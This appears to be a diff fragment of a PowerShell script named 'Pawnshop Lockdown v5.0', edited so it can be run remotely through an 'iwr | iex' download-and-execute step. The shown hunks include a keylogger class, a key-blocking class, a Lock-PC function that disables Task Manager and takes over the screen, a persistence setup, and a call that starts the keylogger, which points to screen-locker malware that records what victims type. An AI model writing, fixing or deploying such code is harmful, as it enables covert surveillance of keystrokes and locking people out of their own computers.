@@ -1,4 +1,4 @@
-# Pawnshop Lockdown v5.0 - Full working version for remote execution
+# Pawnshop Lockdown v5.0 - Fixed for iwr | iex execution
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
@@ -155,10 +155,8 @@ public class KeyLogger {
 }
 "@
 
-# --- GLOBAL VARIABLES ---
 $global:lockActive = $false
 
-# --- FUNCTION TO HANDLE KEYWORD ALERT ---
 function On-KeywordDetected {
     param([string]$typedText)
     if (-not $global:lockActive) {
@@ -222,7 +220,6 @@ public class KeyBlocker {
 }
 "@
 
-# --- LOCK-PC FUNCTION ---
 function Lock-PC {
     $global:lockActive = $true
     Disable-TaskManager
@@ -306,10 +303,8 @@ function Lock-PC {
     [System.Windows.Forms.Application]::Run()
 }
 
-# --- MAIN LISTENER LOOP ---
 Setup-Persistence
 
-# Download lock screen image if missing
 if (-not (Test-Path $tempImg)) {
     try {
         Invoke-WebRequest -Uri $imageURL -OutFile $tempImg
@@ -318,7 +313,6 @@ if (-not (Test-Path $tempImg)) {
     }
 }
 
-# Start keylogger
 [KeyLogger]::Start()
 
 $offset = 0
